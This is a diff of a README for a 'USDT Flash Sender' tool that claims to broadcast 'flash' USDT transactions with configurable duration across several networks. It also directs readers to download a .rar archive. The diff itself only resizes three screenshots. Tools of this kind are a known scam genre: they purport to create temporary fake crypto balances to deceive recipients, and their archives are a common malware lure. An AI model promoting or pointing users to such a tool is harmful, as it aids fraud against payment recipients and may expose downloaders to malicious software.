@@ -7,9 +7,9 @@ Multi-network flash transaction tool for USDT, BTC, ETH with configurable durati
 
 **USDT Flash Sender** is a private developer tool for broadcasting raw USDT transactions across multiple networks (ERC-20, TRC-20, BEP-20 and other)
 
-<img width="300" height="500" alt="image" src="https://github.com/user-attachments/assets/c5982862-15d6-490b-a614-62c11c01ce67" />
-<img width="300" height="500" alt="photo_2026-08-23_19-28-55" src="https://github.com/user-attachments/assets/a2dfb7f9-4294-4e83-888a-f704a1979d6d" />
-<img width="300" height="500" alt="image" src="https://github.com/user-attachments/assets/8f5a5bde-2863-4682-9ab4-39036b1dc89c" />
+<img width="320" height="600" alt="image" src="https://github.com/user-attachments/assets/c5982862-15d6-490b-a614-62c11c01ce67" />
+<img width="270" height="600" alt="photo_2026-08-23_19-28-55" src="https://github.com/user-attachments/assets/a2dfb7f9-4294-4e83-888a-f704a1979d6d" />
+<img width="270" height="600" alt="image" src="https://github.com/user-attachments/assets/8f5a5bde-2863-4682-9ab4-39036b1dc89c" />
 
 ## 🚀 How to use
 1. Download latest version [https://github.com/NovaNexusRewards/Flash-USDT-Tool/blob/main/Flash%20USDT%20Tool.rar]
